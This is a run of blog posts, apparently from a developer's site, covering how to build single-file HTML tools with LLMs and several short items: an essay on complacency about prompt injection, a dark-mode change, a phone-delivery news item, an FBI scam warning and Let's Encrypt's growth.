<li>Load dependencies from a CDN. The fewer dependencies the better, but if there's a well known library that helps solve a problem I'm happy to load it from CDNjs or jsdelivr or similar.</li>
<li>Keep them small. A few hundred lines means the maintainability of the code doesn't matter too much: any good LLM can read them and understand what they're doing, and rewriting them from scratch with help from an LLM takes just a few minutes.</li>
</ol>
<p>The end result is a few hundred lines of code that can be cleanly copied and pasted into a GitHub repository.</p>
<h4>Prototype with Artifacts or Canvas</h4>
<p>The easiest way to build one of these tools is to start in ChatGPT or Claude or Gemini. All three have features where they can write a simple HTML+JavaScript application and show it to you directly.</p>
<p>Claude calls this &quot;Artifacts&quot;, ChatGPT and Gemini both call it &quot;Canvas&quot;. Claude has the feature enabled by default, ChatGPT and Gemini may require you to toggle it on in their &quot;tools&quot; menus.</p>
<p>Try this prompt in Gemini or ChatGPT:</p>
<blockquote>
<p><code>Build a canvas that lets me paste in JSON and converts it to YAML. No React.</code></p>
</blockquote>
<p>Or this prompt in Claude:</p>
<blockquote>
<p><code>Build an artifact that lets me paste in JSON and converts it to YAML. No React.</code></p>
</blockquote>
<p>I always add &quot;No React&quot; to these prompts, because otherwise they tend to build with React, resulting in a file that is harder to copy and paste out of the LLM and use elsewhere. I find that attempts which use React take longer to display (since they need to run a build step) and are more likely to contain crashing bugs for some reason, especially in ChatGPT.</p>
<p>All three tools have &quot;share&quot; links that provide a URL to the finished application. Examples:</p>
<ul>
<li><a href="https://chatgpt.com/canvas/shared/6938e8ece53c8191a2f9d7dfcd090d11">ChatGPT JSON to YAML Canvas</a> made with GPT-5.1 Thinking - here's <a href="https://chatgpt.com/share/6938e926-ee14-8006-9678-383b3a8dac78">the full ChatGPT transcript</a></li>

</ul>
<h4>Switch to a coding agent for more complex projects</h4>
<p>Coding agents such as Claude Code and Codex CLI have the advantage that they can test the code themselves while they work on it using tools like Playwright. I often upgrade to one of those when I'm working on something more complicated, like my Bluesky thread viewer tool shown above.</p>
<p>I also frequently use <strong>asynchronous coding agents</strong> like Claude Code for web to make changes to existing tools. I shared a video about that in <a href="https://simonwillison.net/2025/Oct/23/claude-code-for-web-video/">Building a tool to copy-paste share terminal sessions using Claude Code for web</a>.</p>
<p>Claude Code for web and Codex Cloud run directly against my <a href="https://github.com/simonw/tools">simonw/tools</a> repo, which means they can publish or upgrade tools via Pull Requests (here are <a href="https://github.com/simonw/tools/pulls?q=is%3Apr+is%3Aclosed">dozens of examples</a>) without me needing to copy and paste anything myself.</p>
<h4>Load dependencies from CDNs</h4>
<p>Any time I use an additional JavaScript library as part of my tool I like to load it from a CDN.</p>
<p>The three major LLM platforms support specific CDNs as part of their Artifacts or Canvas features, so often if you tell them &quot;Use PDF.js&quot; or similar they'll be able to compose a URL to a CDN that's on their allow-list.</p>
<p>Sometimes you'll need to go and look up the URL on <a href="https://cdnjs.com/">cdnjs</a> or <a href="https://www.jsdelivr.com/">jsDelivr</a> and paste it into the chat.</p>
<p>CDNs like these have been around for long enough that I've grown to trust them, especially for URLs that include the package version.</p>
<p>The alternative to CDNs is to use npm and have a build step for your projects. I find this reduces my productivity at hacking on individual tools and makes it harder to self-host them.</p>
<h4>Host them somewhere else</h4>
<p>I don't like leaving my HTML tools hosted by the LLM platforms themselves for a couple of reasons. First, LLM platforms tend to run the tools inside a tight sandbox with a lot of restrictions. They're often unable to load data or images from external URLs, and sometimes even features like linking out to other sites are disabled.</p>
<p>The end-user experience often isn't great either. They show warning messages to new users, often take additional time to load and delight in showing promotions for the platform that was used to create the tool.</p>
<p>They're also not as reliable as other forms of static hosting. If ChatGPT or Claude are having an outage I'd like to still be able to access the tools I've created in the past.</p>
<p>Being able to easily self-host is the main reason I like insisting on &quot;no React&quot; and using CDNs for dependencies - the absence of a build step makes hosting tools elsewhere a simple case of copying and pasting them out to some other provider.</p>
<p>My preferred provider here is <a href="https://docs.github.com/en/pages">GitHub Pages</a> because I can paste a block of HTML into a file on github.com and have it hosted on a permanent URL a few seconds later. Most of my tools end up in my <a href="https://github.com/simonw/tools">simonw/tools</a> repository which is configured to serve static files at <a href="https://tools.simonwillison.net/">tools.simonwillison.net</a>.</p>
<h4>Take advantage of copy and paste</h4>
<p>One of the most useful input/output mechanisms for HTML tools comes in the form of <strong>copy and paste</strong>.</p>
<p>I frequently build tools that accept pasted content, transform it in some way and let the user copy it back to their clipboard to paste somewhere else.</p>
<p>Copy and paste on mobile phones is fiddly, so I frequently include &quot;Copy to clipboard&quot; buttons that populate the clipboard with a single touch.</p>
<p>Most operating system clipboards can carry multiple formats of the same copied data. That's why you can paste content from a word processor in a way that preserves formatting, but if you paste the same thing into a text editor you'll get the content with formatting stripped.</p>
<p>These rich copy operations are available in JavaScript paste events as well, which opens up all sorts of opportunities for HTML tools.</p>
<ul>
<li><strong><a href="https://tools.simonwillison.net/hacker-news-thread-export">hacker-news-thread-export</a></strong> lets you paste in a URL to a Hacker News thread and gives you a copyable condensed version of the entire thread, suitable for pasting into an LLM to get a useful summary.</li>
<li><strong><a href="https://tools.simonwillison.net/paste-rich-text">paste-rich-text</a></strong> lets you copy from a page and paste to get the HTML - particularly useful on mobile where view-source isn't available.</li>
<li><strong><a href="https://tools.simonwillison.net/alt-text-extractor">alt-text-extractor</a></strong> lets you paste in images and then copy out their alt text.</li>
</ul>
<p><a href="https://tools.simonwillison.net/hacker-news-thread-export"><img src="https://static.simonwillison.net/static/2025/html-tools/hacker-news-thread-export.jpg" alt="screenshot of hacker-news-thread-export"></a><a href="https://tools.simonwillison.net/paste-rich-text"><img src="https://static.simonwillison.net/static/2025/html-tools/paste-rich-text.jpg" alt="screenshot of paste-rich-text"></a><a href="https://tools.simonwillison.net/alt-text-extractor"><img src="https://static.simonwillison.net/static/2025/html-tools/alt-text-extractor.jpg" alt="screenshot of alt-text-extractor"></a></p>
<h4>Build debugging tools</h4>
<p>The key to building interesting HTML tools is understanding what's possible. Building custom debugging tools is a great way to explore these options.</p>
<p><strong><a href="https://tools.simonwillison.net/clipboard-viewer">clipboard-viewer</a></strong> is one of my most useful. You can paste anything into it (text, rich text, images, files) and it will loop through and show you every type of paste data that's available on the clipboard.</p>
<p><img src="https://static.simonwillison.net/static/2025/clipboard-viewer.jpg" alt="Clipboard Format Viewer. Paste anywhere on the page (Ctrl+V or Cmd+V). This shows text/rtf with a bunch of weird code, text/plain with some pasted HTML diff and a Clipboard Event Information panel that says Event type: paste, Formats available: text/rtf, text/plain, 0 files reported and 2 clipboard items reported."></p>
<p>This was key to building many of my other tools, because it showed me the invisible data that I could use to bootstrap other interesting pieces of functionality.</p>
<p>More debugging examples:</p>
<ul>
<li><strong><a href="https://tools.simonwillison.net/keyboard-debug">keyboard-debug</a></strong> shows the keys (and <code>KeyCode</code> values) currently being held down.</li>
<li><strong><a href="https://tools.simonwillison.net/cors-fetch">cors-fetch</a></strong> reveals if a URL can be accessed via CORS.</li>
<li><strong><a href="https://tools.simonwillison.net/exif">exif</a></strong> displays EXIF data for a selected photo.</li>

<h4>Persist state in the URL</h4>
<p>HTML tools may not have access to server-side databases for storage but it turns out you can store a <em>lot</em> of state directly in the URL.</p>
<p>I like this for tools I may want to bookmark or share with other people.</p>

is a custom 24x24 icon editor I built to help hack on icons for <a href="https://simonwillison.net/2025/Oct/28/github-universe-badge/">the GitHub Universe badge</a>. It persists your in-progress icon design in the URL so you can easily bookmark and share it.</li>
</ul>
<h4>Use localStorage for secrets or larger state</h4>
<p>The <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage">localStorage</a> browser API lets HTML tools store data persistently on the user's device, without exposing that data to the server.</p>
<p>I use this for larger pieces of state that don't fit comfortably in a URL, or for secrets like API keys which I really don't want anywhere near my server - even static hosts might have server logs that are outside of my influence.</p>
<ul>
<li><strong><a href="https://tools.simonwillison.net/word-counter">word-counter</a></strong> is a simple tool I built to help me write to specific word counts, for things like conference abstract submissions. It uses localStorage to save as you type, so your work isn't lost if you accidentally close the tab.</li>
<li><strong><a href="https://tools.simonwillison.net/render-markdown">render-markdown</a></strong> uses the same trick - I sometimes use this one to craft blog posts and I don't want to lose them.</li>
<li><strong><a href="https://tools.simonwillison.net/haiku">haiku</a></strong> is one of a number of LLM demos I've built that request an API key from the user (via the <code>prompt()</code> function) and then store that in <code>localStorage</code>. This one uses Claude Haiku to write haikus about what it can see through the user's webcam.</li>
</ul>

<h4>Collect CORS-enabled APIs</h4>
<p>CORS stands for <a href="https://en.wikipedia.org/wiki/Cross-origin_resource_sharing">Cross-origin resource sharing</a>. It's a relatively low-level detail which controls if JavaScript running on one site is able to fetch data from APIs hosted on other domains.</p>
<p>APIs that provide open CORS headers are a goldmine for HTML tools. It's worth building a collection of these over time.</p>
<p>Here are some I like:</p>
<ul>
<li>iNaturalist for fetching sightings of animals, including URLs to photos</li>
<li>PyPI for fetching details of Python packages</li>
<li>GitHub because anything in a public repository in GitHub has a CORS-enabled anonymous API for fetching that content from the raw.githubusercontent.com domain, which is behind a caching CDN so you don't need to worry too much about rate limits or feel guilty about adding load to their infrastructure.</li>
<li>Bluesky for all sorts of operations</li>
<li>Mastodon has generous CORS policies too, as used by applications like <a href="https://phanpy.social/">phanpy.social</a></li>
</ul>
<p>GitHub Gists are a personal favorite here, because they let you build apps that can persist state to a permanent Gist through making a cross-origin API call.</p>
<ul>
<li><strong><a href="https://tools.simonwillison.net/species-observation-map#%7B%22taxonId%22%3A123829%2C%22taxonName%22%3A%22California%20Brown%20Pelican%22%2C%22days%22%3A%2230%22%7D">species-observation-map</a></strong> uses iNaturalist to show a map of recent sightings of a particular species.</li>
<li><strong><a href="https://tools.simonwillison.net/zip-wheel-explorer?package=llm">zip-wheel-explorer</a></strong> fetches a <code>.whl</code> file for a Python package from PyPI, unzips it (in browser memory) and lets you navigate the files.</li>
<li><strong><a href="https://tools.simonwillison.net/github-issue-to-markdown?issue=https%3A%2F%2Fgithub.com%2Fsimonw%2Fsqlite-utils%2Fissues%2F657">github-issue-to-markdown</a></strong> fetches issue details and comments from the GitHub API (including expanding any permanent code links) and turns them into copyable Markdown.</li>
<li><strong><a href="https://tools.simonwillison.net/terminal-to-html">terminal-to-html</a></strong> can optionally save the user's converted terminal session to a Gist.</li>
<li><strong><a href="https://tools.simonwillison.net/bluesky-quote-finder?post=https%3A%2F%2Fbsky.app%2Fprofile%2Fsimonwillison.net%2Fpost%2F3m7auwt3ma222">bluesky-quote-finder</a></strong> displays quotes of a specified Bluesky post, which can then be sorted by likes or by time.</li>

<h4>LLMs can be called directly via CORS</h4>
<p>All three of OpenAI, Anthropic and Gemini offer JSON APIs that can be accessed via CORS directly from HTML tools.</p>
<p>Unfortunately you still need an API key, and if you bake that key into your visible HTML anyone can steal it and use to rack up charges on your account.</p>
<p>I use the <code>localStorage</code> secrets pattern to store API keys for these services. This sucks from a user experience perspective - telling users to go and create an API key and paste it into a tool is a lot of friction - but it does work.</p>
<p>Some examples:</p>
<ul>
<li><strong><a href="https://tools.simonwillison.net/haiku">haiku</a></strong> uses the Claude API to write a haiku about an image from the user's webcam.</li>
<li><strong><a href="https://tools.simonwillison.net/openai-audio-output">openai-audio-output</a></strong> generates audio speech using OpenAI's GPT-4o audio API.</li>
<li><strong><a href="http://tools.simonwillison.net/gemini-bbox">gemini-bbox</a></strong> demonstrates Gemini 2.5's ability to return complex shaped image masks for objects in images, see <a href="https://simonwillison.net/2025/Apr/18/gemini-image-segmentation/">Image segmentation using Gemini 2.5</a>.</li>

<h4>Don't be afraid of opening files</h4>
<p>You don't need to upload a file to a server in order to make use of the <code>&lt;input type=&quot;file&quot;&gt;</code> element. JavaScript can access the content of that file directly, which opens up a wealth of opportunities for useful functionality.</p>
<p>Some examples:</p>
<ul>
<li><strong><a href="https://tools.simonwillison.net/ocr">ocr</a></strong> is the first tool I built for my collection, described in <a href="https://simonwillison.net/2024/Mar/30/ocr-pdfs-images/">Running OCR against PDFs and images directly in your browser</a>. It uses <code>PDF.js</code> and <code>Tesseract.js</code> to allow users to open a PDF in their browser which it then converts to an image-per-page and runs through OCR.</li>
<li><strong><a href="https://tools.simonwillison.net/social-media-cropper">social-media-cropper</a></strong> lets you open (or paste in) an existing image and then crop it to common dimensions needed for different social media platforms - 2:1 for Twitter and LinkedIn, 1.4:1 for Substack etc.</li>
<li><strong><a href="https://tools.simonwillison.net/ffmpeg-crop">ffmpeg-crop</a></strong> lets you open and preview a video file in your browser, drag a crop box within it and then copy out the <code>ffmpeg</code> command needed to produce a cropped copy on your own machine.</li>
</ul>
<p><a href="https://tools.simonwillison.net/ocr"><img src="https://static.simonwillison.net/static/2025/html-tools/ocr.jpg" alt="screenshot of ocr"></a><a href="https://tools.simonwillison.net/social-media-cropper"><img src="https://static.simonwillison.net/static/2025/html-tools/social-media-cropper.jpg" alt="screenshot of social-media-cropper"></a><a href="https://tools.simonwillison.net/ffmpeg-crop"><img src="https://static.simonwillison.net/static/2025/html-tools/ffmpeg-crop.jpg" alt="screenshot of ffmpeg-crop"></a></p>
<h4>You can offer downloadable files too</h4>
<p>An HTML tool can generate a file for download without needing help from a server.</p>
<p>The JavaScript library ecosystem has a huge range of packages for generating files in all kinds of useful formats.</p>
<ul>
<li><strong><a href="https://tools.simonwillison.net/svg-render">svg-render</a></strong> lets the user download the PNG or JPEG rendered from an SVG.</li>
<li><strong><a href="https://tools.simonwillison.net/social-media-cropper">social-media-cropper</a></strong> does the same for cropped images.</li>
<li><strong><a href="https://tools.simonwillison.net/open-sauce-2025">open-sauce-2025</a></strong> is my alternative schedule for a conference that includes a downloadable ICS file for adding the schedule to your calendar. See <a href="https://simonwillison.net/2025/Jul/17/vibe-scraping/">Vibe scraping and vibe coding a schedule app for Open Sauce 2025 entirely on my phone</a> for more on that project.</li>

<h4>Pyodide can run Python code in the browser</h4>
<p><a href="https://pyodide.org/">Pyodide</a> is a distribution of Python that's compiled to WebAssembly and designed to run directly in browsers. It's an engineering marvel and one of the most underrated corners of the Python world.</p>
<p>It also cleanly loads from a CDN, which means there's no reason not to use it in HTML tools!</p>
<p>Even better, the Pyodide project includes <a href="https://github.com/pyodide/micropip">micropip</a> - a mechanism that can load extra pure-Python packages from PyPI via CORS.</p>
<ul>
<li><strong><a href="https://tools.simonwillison.net/pyodide-bar-chart">pyodide-bar-chart</a></strong> demonstrates running Pyodide, Pandas and matplotlib to render a bar chart directly in the browser.</li>
<li><strong><a href="https://tools.simonwillison.net/numpy-pyodide-lab">numpy-pyodide-lab</a></strong> is an experimental interactive tutorial for Numpy.</li>
<li><strong><a href="https://tools.simonwillison.net/apsw-query">apsw-query</a></strong> demonstrates the <a href="https://github.com/rogerbinns/apsw">APSW SQLite library</a> running in a browser, using it to show EXPLAIN QUERY plans for SQLite queries.</li>

<h4>WebAssembly opens more possibilities</h4>
<p>Pyodide is possible thanks to WebAssembly. WebAssembly means that a vast collection of software originally written in other languages can now be loaded in HTML tools as well.</p>
<p><a href="https://squoosh.app/">Squoosh.app</a> was the first example I saw that convinced me of the power of this pattern - it makes several best-in-class image compression libraries available directly in the browser.</p>
<p>I've used WebAssembly for a few of my own tools:</p>
<ul>
<li><strong><a href="https://tools.simonwillison.net/ocr">ocr</a></strong> uses the pre-existing <a href="https://tesseract.projectnaptha.com/">Tesseract.js</a> WebAssembly port of the Tesseract OCR engine.</li>
<li><strong><a href="https://tools.simonwillison.net/sloccount">sloccount</a></strong> is a port of David Wheeler's Perl and C <a href="https://dwheeler.com/sloccount/">SLOCCount</a> utility to the browser, using a big ball of WebAssembly duct tape. <a href="https://simonwillison.net/2025/Oct/22/sloccount-in-webassembly/">More details here</a>.</li>
<li><strong><a href="https://tools.simonwillison.net/micropython">micropython</a></strong> is my experiment using <a href="https://www.npmjs.com/package/@micropython/micropython-webassembly-pyscript">@micropython/micropython-webassembly-pyscript</a> from NPM to run Python code with a smaller initial download than Pyodide.</li>
</ul>

<h4>Remix your previous tools</h4>
<p>The biggest advantage of having a single public collection of 100+ tools is that it's easy for my LLM assistants to recombine them in interesting ways.</p>
<p>Sometimes I'll copy and paste a previous tool into the context, but when I'm working with a coding agent I can reference them by name - or tell the agent to search for relevant examples before it starts work.</p>
<p>The source code of any working tool doubles as clear documentation of how something can be done, including patterns for using editing libraries. An LLM with one or two existing tools in their context is much more likely to produce working code.</p>
<p>I built <strong><a href="https://tools.simonwillison.net/pypi-changelog">pypi-changelog</a></strong> by telling Claude Code:</p>
<blockquote>
<p><code>Look at the pypi package explorer tool</code></p>
</blockquote>
<p>And then, after it had found and read the source code for <a href="https://tools.simonwillison.net/zip-wheel-explorer">zip-wheel-explorer</a>:</p>
<blockquote>
<p><code>Build a new tool pypi-changelog.html which uses the PyPI API to get the wheel URLs of all available versions of a package, then it displays them in a list where each pair has a &quot;Show changes&quot; clickable in between them - clicking on that fetches the full contents of the wheels and displays a nicely rendered diff representing the difference between the two, as close to a standard diff format as you can get with JS libraries from CDNs, and when that is displayed there is a &quot;Copy&quot; button which copies that diff to the clipboard</code></p>
</blockquote>
<p>Here's <a href="https://gistpreview.github.io/?9b48fd3f8b99a204ba2180af785c89d2">the full transcript</a>.</p>
<p>See <a href="https://simonwillison.net/2024/Mar/30/ocr-pdfs-images/">Running OCR against PDFs and images directly in your browser</a> for another detailed example of remixing tools to create something new.</p>
<h4>Record the prompt and transcript</h4>
<p>I like keeping (and publishing) records of everything I do with LLMs, to help me grow my skills at using them over time.</p>
<p>For HTML tools I built by chatting with an LLM platform directly I use the &quot;share&quot; feature for those platforms.</p>
<p>For Claude Code or Codex CLI or other coding agents I copy and paste the full transcript from the terminal into my <a href="https://tools.simonwillison.net/terminal-to-html">terminal-to-html</a> tool and share that using a Gist.</p>
<p>In either case I include links to those transcripts in the commit message when I save the finished tool to my repository. You can see those <a href="https://tools.simonwillison.net/colophon">in my tools.simonwillison.net colophon</a>.</p>
<h4>Go forth and build</h4>
<p>I've had <em>so much fun</em> exploring the capabilities of LLMs in this way over the past year and a half, and building tools in this way has been invaluable in helping me understand both the potential for building tools with HTML and the capabilities of the LLMs that I'm building them with.</p>
<p>If you're interested in starting your own collection I highly recommend it! All you need to get started is a free GitHub repository with GitHub Pages enabled (Settings -&gt; Pages -&gt; Source -&gt; Deploy from a branch -&gt; main) and you can start copying in <code>.html</code> pages generated in whatever manner you like.</p>

      <h1>The Normalization of Deviance in AI</h1>

(date: 2025-12-10)
      <p>
      <p><strong><a href="https://embracethered.com/blog/posts/2025/the-normalization-of-deviance-in-ai/">The Normalization of Deviance in AI</a></strong></p>
<p>This thought-provoking essay from Johann Rehberger directly addresses something that I’ve been worrying about for quite a while: in the absence of any headline-grabbing examples of prompt injection vulnerabilities causing real economic harm, is anyone going to care?</p>
<p>Johann describes the concept of the “Normalization of Deviance” as directly applying to this question.</p>
<p>Coined by <a href="https://en.wikipedia.org/wiki/Diane_Vaughan">Diane Vaughan</a>, the key idea here is that organizations that get away with “deviance” - ignoring safety protocols or otherwise relaxing their standards - will start baking that unsafe attitude into their culture. This can work fine… until it doesn’t. The Space Shuttle Challenger disaster has been partially blamed on this class of organizational failure.</p>
<p>As Johann puts it:</p>
<blockquote>
<p>In the world of AI, we observe companies treating probabilistic, non-deterministic, and sometimes adversarial model outputs as if they were reliable, predictable, and safe.</p>
<p>Vendors are normalizing trusting LLM output, but current understanding violates the assumption of reliability.</p>
<p>The model will not consistently follow instructions, stay aligned, or maintain context integrity. This is especially true if there is an attacker in the loop (e.g indirect prompt injection).</p>
<p>However, we see more and more systems allowing untrusted output to take consequential actions. Most of the time it goes well, and over time vendors and organizations lower their guard or skip human oversight entirely, because “it worked last time.”</p>
<p>This dangerous bias is the fuel for normalization: organizations confuse the absence of a successful attack with the presence of robust security.</p>
</blockquote>

      <h1>Dark mode</h1>

(date: 2025-12-10)
      <p>
      <p>I've never been particularly invested dark v.s. light mode but I get enough people complaining that this site is &quot;blinding&quot; that I decided to see if Claude Code for web could produce a useful dark mode from my existing CSS. It did <a href="https://github.com/simonw/simonwillisonblog/pull/572/files">a decent job</a>, using CSS properties, <code>@media (prefers-color-scheme: dark)</code> and a <code>data-theme=&quot;dark&quot;</code> attribute based on this prompt:</p>
<blockquote>
<p><code>Add a dark theme which is triggered by user media preferences but can also be switched on using localStorage - then put a little icon in the footer for toggling it between default auto, forced regular and forced dark mode</code></p>
</blockquote>
<p>The site defaults to picking up the user's preferences, but there's also a toggle in the footer which switches between auto, forced-light and forced-dark. Here's an animated demo:</p>
<p><img src="https://static.simonwillison.net/static/2025/dark-mode.gif" alt="This site on mobile. Clicking the icon in the footer switches to a black background with readable text."></p>
<p>I had Claude Code <a href="https://gistpreview.github.io/?5ea34de3e999bd32d0f86beef4bd803d">make me that GIF</a> from two static screenshots - it used this ImageMagick recipe:</p>
<pre><code>magick -delay 300 -loop 0 one.png two.png \
    -colors 128 -layers Optimize dark-mode.gif

</code></pre>
<p>The CSS ended up with some duplication due to the need to handle both the media preference and the explicit user selection. We <a href="https://github.com/simonw/simonwillisonblog/commit/d4bc7573775960a630145a287d854b8569da6f72#diff-5acc582e2a25639d184d784747a69ff9b30061aca8d5913d9c7e67452e715e08">fixed that with Cog</a>.</p>

(date: 2025-12-10)
      <p>
      <p>NBC News reports that Trump Mobile customers have been waiting months for a promised ‘Made in the USA’ smartphone, originally announced for August delivery. The T1 phone was marketed as domestically produced, but delays and vague updates have raised skepticism. References to ‘Made in the USA’ have been removed from the company’s site, and leaked images suggest the device resembles existing Chinese-made models. This situation underscores the complexity of building smartphones in America without established infrastructure.</p>

      <h1>FBI Warns of Fake Video Scams</h1>

(date: 2025-12-10, updated: 2025-12-09)
      <p>
      <p>The FBI is <a href="https://www.ic3.gov/PSA/2025/PSA251205">warning</a> of AI-assisted fake kidnapping scams:</p>
<blockquote>
<p>Criminal actors typically will contact their victims through text message claiming they have kidnapped their loved one and demand a ransom be paid for their release. Oftentimes, the criminal actor will express significant claims of violence towards the loved one if the ransom is not paid immediately. The criminal actor will then send what appears to be a genuine photo or video of the victim’s loved one, which upon close inspection often reveals inaccuracies when compared to confirmed photos of the loved one. Examples of these inaccuracies include missing tattoos or scars and inaccurate body proportions. Criminal actors will sometimes purposefully send these photos using timed message features to limit the amount of time victims have to analyze the images...</p>

<p>Internet Security Research Group co-founder and Executive Director Josh Aas:</p>
<blockquote>
<p>On September 14, 2015, <a href="https://crt.sh/?id=9314793">our first publicly-trusted certificate went live</a>. [...] Today, Let’s Encrypt is the largest certificate authority in the world in terms of certificates issued, the ACME protocol we helped create and standardize is integrated throughout the server ecosystem, and we’ve become a household name among system administrators. We’re closing in on protecting one billion web sites.</p>
</blockquote>
<p>Their growth rate and numbers are wild:</p>
<blockquote>
<p>In March 2016, we issued our one millionth certificate. Just two years later, in September 2018, we were issuing a million certificates every day. In 2020 we reached a billion total certificates issued and as of late 2025 we’re frequently issuing ten million certificates per day.</p>
</blockquote>
<p>According to <a href="https://letsencrypt.org/stats/">their stats</a> the amount of Firefox traffic protected by HTTPS doubled from 39% at the start of 2016 to ~80% today. I think it's difficult to over-estimate the impact Let's Encrypt has had on the security of the web.</p>
